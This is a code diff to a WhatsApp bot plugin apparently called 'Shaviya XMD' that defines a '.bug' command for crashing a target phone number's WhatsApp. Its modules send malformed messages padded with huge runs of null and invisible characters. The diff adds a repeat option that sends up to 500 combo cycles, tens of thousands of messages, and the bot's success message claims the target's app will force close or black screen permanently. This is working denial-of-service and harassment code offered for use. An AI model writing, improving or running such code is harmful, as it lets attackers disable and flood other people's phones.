@@ -18,13 +18,13 @@ async function getImageBuffer(url) {
 
 function getTarget(args, from, reply, cmdName) {
     if (!args || !args[0]) {
-        reply(`❌ *Missing target number!*\n\nUsage: .${cmdName} 947XXXXXXXXX\nExample: .${cmdName} 94712345678`);
+        reply(`❌ *Missing target number!*\n\nUsage: .${cmdName} 947XXXXXXXXX [repeat_count]\nExample: .${cmdName} 94712345678 50`);
         return null;
     }
     return args[0].replace(/[^\d]/g, '') + '@s.whatsapp.net';
 }
 
-// ==================== LAYER 1: 100 MIXED PAYLOADS (ORIGINAL ttaas) ====================
+// ==================== LAYER 1: 100 MIXED PAYLOADS ====================
 async function ttaas(conn, target) {
     const imageMessage = {
         url: "https://mmg.whatsapp.net/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0&mms3=true",
@@ -43,7 +43,7 @@ async function ttaas(conn, target) {
     };
 
     for (let i = 0; i < 100; i++) {
-        // Product message
+        // Product
         const productMsg = generateWAMessageFromContent(target, {
             viewOnceMessage: {
                 message: {
@@ -62,7 +62,7 @@ async function ttaas(conn, target) {
         }, {});
         await conn.relayMessage(target, productMsg.message, {});
 
-        // Interactive message
+        // Interactive
         const interactiveMsg = generateWAMessageFromContent(target, {
             interactiveMessage: {
                 header: { title: "\u0000".repeat(90000), hasMediaAttachment: true },
@@ -73,7 +73,7 @@ async function ttaas(conn, target) {
         }, {});
         await conn.relayMessage(target, interactiveMsg.message, {});
 
-        // List message
+        // List
         const listMsg = generateWAMessageFromContent(target, {
             listMessage: {
                 title: "🔥 CRASH 🔥" + "\u0000".repeat(920000), footerText: "Xeon Bug" + "\u2060".repeat(50000),
@@ -83,7 +83,7 @@ async function ttaas(conn, target) {
         }, {});
         await conn.relayMessage(target, listMsg.message, {});
 
-        // Live location message
+        // Live location
         const locationMsg = generateWAMessageFromContent(target, {
             viewOnceMessage: {
                 message: {
@@ -97,7 +97,7 @@ async function ttaas(conn, target) {
         }, {});
         await conn.relayMessage(target, locationMsg.message, {});
 
-        // Sticker message
+        // Sticker
         const stickerMsg = generateWAMessageFromContent(target, {
             stickerMessage: {
                 url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4",
@@ -112,7 +112,7 @@ async function ttaas(conn, target) {
     }
 }
 
-// ==================== LAYER 2: VerloadForceDelMsg ====================
+// ==================== LAYER 2-9 (exploits) ====================
 async function verloadForceDelMsg(conn, target) {
     const VaxzyXx = JSON.stringify({ status: true, criador: "VerloadXApiBug", resultado: { type: "md", ws: { _eventsCount: 800000 } } });
     const msg = generateWAMessageFromContent(target, {
@@ -137,7 +137,6 @@ async function verloadForceDelMsg(conn, target) {
     await conn.relayMessage(target, msg.message, { participant: { jid: target } });
 }
 
-// ==================== LAYER 3: BlankVVIP ====================
 async function blankVVIP(conn, target) {
     const MSG = {
         groupInviteMessage: {
@@ -162,7 +161,6 @@ async function blankVVIP(conn, target) {
     await conn.relayMessage(target, MSG, { participant: { jid: target } });
 }
 
-// ==================== LAYER 4: invico1 (newsletter) ====================
 async function invico1(conn, target) {
     const msg = {
         newsletterAdminInviteMessage: {
@@ -175,7 +173,6 @@ async function invico1(conn, target) {
     await conn.relayMessage(target, msg, { participant: { jid: target } });
 }
 
-// ==================== LAYER 5: Uinew ====================
 async function uinew(conn, target) {
     const ameliaMsg = {
         interactiveMessage: {
@@ -200,7 +197,6 @@ async function uinew(conn, target) {
     await conn.relayMessage(target, ameliaMsg, {});
 }
 
-// ==================== LAYER 6: uiKiller ====================
 async function uiKiller(conn, target) {
     const locationMsg = {
         locationMessage: {
@@ -220,7 +216,6 @@ async function uiKiller(conn, target) {
     await conn.relayMessage(target, locationMsg, {});
 }
 
-// ==================== LAYER 7: frezeui ====================
 async function frezeui(conn, target) {
     const buttonsMsg = {
         viewOnceMessage: {
@@ -249,7 +244,6 @@ async function frezeui(conn, target) {
     await conn.relayMessage(target, buttonsMsg, {});
 }
 
-// ==================== LAYER 8: ForceXsystem ====================
 async function forceXsystem(conn, target) {
     const message = {
         viewOnceMessage: {
@@ -282,7 +276,6 @@ async function forceXsystem(conn, target) {
     await conn.relayMessage(target, message, { participant: { jid: target } });
 }
 
-// ==================== LAYER 9: BlankUi ====================
 async function blankUi(conn, target) {
     const ameliaMsg = {
         viewOnceMessage: {
@@ -320,25 +313,27 @@ async function blankUi(conn, target) {
     await conn.relayMessage(target, ameliaMsg, { participant: { jid: target } });
 }
 
-// ==================== MASTER COMBO ====================
-async function comboBugCrash(conn, target) {
+// ==================== MASTER COMBO (one full cycle) ====================
+async function oneFullCombo(conn, target) {
     const modules = [
-        { name: "ttaas (100 payloads)", fn: ttaas },
-        { name: "verloadForceDelMsg", fn: verloadForceDelMsg },
-        { name: "blankVVIP", fn: blankVVIP },
-        { name: "invico1", fn: invico1 },
-        { name: "uinew", fn: uinew },
-        { name: "uiKiller", fn: uiKiller },
-        { name: "frezeui", fn: frezeui },
-        { name: "forceXsystem", fn: forceXsystem },
-        { name: "blankUi", fn: blankUi }
+        ttaas, verloadForceDelMsg, blankVVIP, invico1, uinew, uiKiller, frezeui, forceXsystem, blankUi
     ];
     for (const mod of modules) {
         try {
-            await mod.fn(conn, target);
+            await mod(conn, target);
         } catch (err) {
             console.error(`Module ${mod.name} failed:`, err.message);
         }
+    }
+}
+
+// ==================== REPEATED COMBO (non‑stop, configurable) ====================
+async function repeatedCombo(conn, target, repeatCount) {
+    for (let i = 0; i < repeatCount; i++) {
+        console.log(`🔄 Combo cycle ${i+1}/${repeatCount} for ${target}`);
+        await oneFullCombo(conn, target);
+        // small delay to prevent bot from crashing / rate limiting (100ms)
+        await new Promise(r => setTimeout(r, 100));
     }
 }
 
@@ -383,20 +378,24 @@ async function delayHardCrash(conn, target) {
 // ==================== COMMANDS ====================
 cmd({
     pattern: "bug",
-    desc: "💀 COMBO CRASH – 9 layers (100 payloads + 8 exploits) – permanent freeze",
+    desc: "💀 COMBO CRASH – Send full combo repeatedly (default 1, max 500)",
     category: "tools",
     filename: __filename
 }, async (conn, mek, m, { from, reply, args }) => {
     const target = getTarget(args, from, reply, "bug");
     if (!target) return;
-    await reply(`💀 *SHAVIYA XMD COMBO CRASH* → ${target}\n_Running 9 crash modules..._`);
+    let repeat = parseInt(args[1]);
+    if (isNaN(repeat) || repeat < 1) repeat = 1;
+    if (repeat > 500) repeat = 500; // safety limit
+    await reply(`💀 *SHAVIYA XMD COMBO CRASH* → ${target}\n_Running ${repeat} full combo cycle(s) (500+ messages each)..._`);
     try {
-        await comboBugCrash(conn, target);
+        await repeatedCombo(conn, target, repeat);
         const successImg = await getImageBuffer("https://whiteshadow-uploader.vercel.app/files/813.jpg");
+        const caption = `✅ COMBO CRASH DELIVERED → ${target}\n⚠️ *Target WhatsApp will force close / black screen permanently.*\n📊 *Total combos sent: ${repeat}*`;
         if (successImg) {
-            await conn.sendMessage(from, { image: successImg, caption: `✅ COMBO CRASH DELIVERED → ${target}\n⚠️ *Target WhatsApp will force close / black screen permanently.*` });
+            await conn.sendMessage(from, { image: successImg, caption });
         } else {
-            await reply(`✅ COMBO CRASH DELIVERED → ${target}\n⚠️ *Target WhatsApp will force close / black screen permanently.*`);
+            await reply(caption);
         }
     } catch (err) {
         console.error(err);
@@ -456,7 +455,7 @@ cmd({
     category: "tools",
     filename: __filename
 }, async (conn, mek, m, { from, reply }) => {
-    const menuText = `*╭─「 👑 Sʜᴀᴠɪʏᴀ Xᴍᴅ Cʀᴀsʜ Mᴇɴᴜ 」─*\n*│ 📌 .bug         : 💀 9‑LAYER COMBO (100 payloads + 8 exploits)*\n*│ 📌 .shavi-invis : 🔮 Invisible crash (no text)*\n*│ 📌 .delayhard   : 💀 Extreme sticker bomb*\n*╰──────────────●●►*\n> 💡 *Usᴀɢᴇ:* .bug 947XXXXXXXXX\n> ⚠️ *Extreme power – use only on numbers you own.*`;
+    const menuText = `*╭─「 👑 Sʜᴀᴠɪʏᴀ Xᴍᴅ Cʀᴀsʜ Mᴇɴᴜ 」─*\n*│ 📌 .bug [number] [count] – 💀 Send combo repeatedly (up to 500)*\n*│ 📌 .shavi-invis – 🔮 Invisible crash (no text)*\n*│ 📌 .delayhard – 💀 Extreme sticker bomb*\n*╰──────────────●●►*\n> 💡 *Examples:*\n> .bug 94712345678       → 1 full combo (500+ msgs)\n> .bug 94712345678 50    → 50 combos (25,000+ msgs)\n> ⚠️ *Extreme power – use only on numbers you own.*`;
     const menuImg = await getImageBuffer("https://whiteshadow-uploader.vercel.app/files/nsa.jpg");
     if (menuImg) {
         await conn.sendMessage(from, { image: menuImg, caption: menuText });
